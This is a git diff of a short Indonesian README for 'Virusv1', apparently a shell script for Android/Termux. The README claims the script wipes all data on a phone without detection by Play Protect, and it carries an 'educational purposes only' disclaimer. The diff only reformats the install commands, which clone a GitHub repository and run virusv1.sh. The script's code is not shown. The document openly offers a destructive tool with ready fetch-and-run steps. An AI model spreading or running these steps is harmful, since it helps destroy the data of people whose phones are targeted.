@@ -1,15 +1,23 @@
 # Virusv1
 virus ini dapat menghapus seluruh data hp tanpa terdeteksi oleh play project ingat ini hanya untuk tujuan pendidikan saya tidak bertanggung jawab atas segala kerusakan yang disebabkan oleh virusv1 ini!.
 # Install 
-$pkg update
-$pkg upgrade
-$pkg install figlet
-$pkg install bash
-$pkg install python
-$pip install lolcat 
-$git clone https://github.com/fahadsyihab06/Virusv1
+$pkg update 
+
+$pkg upgrade 
+
+$pkg install figlet 
+
+$pkg install bash 
+
+$pkg install python 
+
+$pip install lolcat  
+
+$git clone https://github.com/fahadsyihab06/Virusv1 
+
 $cd Virusv1 
-$bash virusv1.sh
+
+$bash virusv1.sh 
 
 # link YouTube
 https://youtube.com/@TC20367
